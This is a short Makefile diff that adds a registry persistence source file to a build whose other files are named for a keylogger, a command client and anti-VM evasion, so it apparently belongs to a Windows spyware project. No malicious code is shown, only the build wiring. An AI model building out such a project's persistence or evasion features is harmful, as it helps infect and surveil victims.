@@ -14,7 +14,8 @@ SRCS = \
 	src/keylogger/keypair.c \
 	src/client/client.c \
 	src/client/commands.c \
-	src/z_anti_vm/anti_vm.c
+	src/z_anti_vm/anti_vm.c \
+	src/z_persistence/registry.c
 
 $(TARGET): $(SRCS)
 	$(CC) $(CFLAGS) -o $(TARGET) $(SRCS) -lwininet -liphlpapi
